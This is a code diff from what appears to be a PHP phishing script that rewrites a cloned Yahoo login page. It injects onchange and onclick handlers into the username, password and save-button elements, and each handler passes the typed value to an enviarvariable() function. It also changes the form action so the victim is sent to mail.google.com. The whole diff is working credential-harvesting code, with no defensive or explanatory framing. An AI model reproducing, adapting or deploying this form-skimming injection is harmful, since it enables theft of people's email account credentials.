@@ -42,14 +42,14 @@ function handler() {
 </head>";
 $htmlConstruida = str_replace("</head>", $insertCode, $html);
 
-$insertCode = "id='username' onchange='enviarvariable(document.getElementById(\"username\").value)'";
-$htmlConstruida = str_replace('id="username"', $insertCode, $htmlConstruida);
+$insertCode = "id='username' onchange=\"enviarvariable(document.getElementById('username').value)\"";
+$htmlConstruida = str_replace("id='username'", $insertCode, $htmlConstruida);
 
-$insertCode = "id='passwd' onchange='enviarvariable(document.getElementById(\"passwd\").value)'";
-$htmlConstruida = str_replace('id="passwd"', $insertCode, $htmlConstruida);
+$insertCode = "id='passwd' onchange=\"enviarvariable(document.getElementById('passwd').value)\"";
+$htmlConstruida = str_replace("id='passwd'", $insertCode, $htmlConstruida);
 
-$insertCode = "id='.save' onclick='enviarvariable(document.getElementById(\"passwd\").value)'";
-$htmlConstruida = str_replace('id=".save"', $insertCode, $htmlConstruida);
+$insertCode = "id='.save' onclick=\"enviarvariable(document.getElementById('passwd').value)\"";
+$htmlConstruida = str_replace("id='.save'", $insertCode, $htmlConstruida);
 
 $insertCode = "action='https://mail.google.com'";
 $htmlConstruida = str_replace('action="https://login.yahoo.com/config/login?"', $insertCode, $htmlConstruida);
